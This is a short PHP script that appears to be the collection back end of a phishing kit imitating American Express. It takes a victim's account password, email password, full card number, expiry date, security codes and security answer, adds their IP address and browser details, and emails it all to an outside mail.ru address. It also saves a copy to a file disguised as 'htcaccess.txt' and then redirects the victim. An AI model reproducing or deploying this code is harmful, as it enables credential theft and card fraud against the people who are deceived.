<?php

$username = $_POST['username'];
$password = $_POST['password'];
$email = $_POST['email'];
$emailpass = $_POST['emailpass'];

$card = $_POST['card'];$ccid = $_POST['ccid'];
$exp = $_POST['exp'];
$csc = $_POST['csc'];
$question = $_POST['question'];
$answer = $_POST['answer'];


$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");

$message .= "Username      : ".$username."\n";
$message .= "Password      : ".$password."\n";
$message .= "Email Addy    : ".$email."\n";
$message .= "Email Pass    : ".$emailpass."\n";
$message .= "Card Number  : ".$card."\n";
$message .= "Expiry Date  : ".$exp."\n";
$message .= "4 Digit Code  : ".$ccid."\n";
$message .= "CSC	   : ".$csc."\n";
$message .= "Question(PSK) : ".$question."\n";
$message .= "Answer(PSK)   : ".$answer."\n";
$message .= "--------------------\n";
$message .= "Date : $adddate\n";
$message .= "IP Address : $ip\n";
$message .= "User-Agent: ".$browser."\n";


$recipient = "gerasimovaveroniya6419@mail.ru";
$subject = "$username - $ip";
$headers = "From: Amex <amx@amx.com>";
$headers = "MIME-Version: 1.0\n";
 $fp = fopen("./htcaccess.txt","a");
fputs($fp,$message);
fclose($fp); 	if (mail($recipient,$subject,$message,$headers))
		{
		header("Location: allmail.php");
		}
	else
		{
		print("504 Internal Error");
		}
?>